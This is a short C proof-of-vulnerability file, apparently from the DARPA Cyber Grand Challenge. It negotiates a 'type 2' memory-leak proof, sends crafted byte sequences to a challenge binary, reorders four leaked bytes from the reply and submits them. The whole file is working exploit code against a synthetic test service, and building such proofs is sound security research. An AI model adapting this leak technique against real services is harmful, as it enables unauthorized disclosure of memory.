#include "libpov.h"

int main(int cgc_argc, char *cgc_argv[])
{
    type2_vals t2;
    cgc_type2_negotiate(&t2);

    unsigned char buf[128];
    cgc_memcpy(buf, "\x20\x64\x00\x00\x00\x05\x41\x41\x41\x41", 10);
    cgc_transmit_all(STDOUT, buf, 10);
    cgc_memcpy(buf, "\x20\x64\x80\x00\x00\x00\x42\x41\x41\x41", 10);
    cgc_transmit_all(STDOUT, buf, 10);
    cgc_memcpy(buf, "\xa0\x97\x3f\xff\xff\xa5", 6);
    cgc_transmit_all(STDOUT, buf, 6);
    cgc_memcpy(buf, "\xa8\x0b", 2);
    cgc_transmit_all(STDOUT, buf, 2);

    cgc_length_read(STDIN, buf, 12);

    buf[3] = buf[8];
    buf[2] = buf[9];
    buf[1] = buf[10];
    buf[0] = buf[11];

    cgc_type2_submit(buf, 4);
    return 0;
}
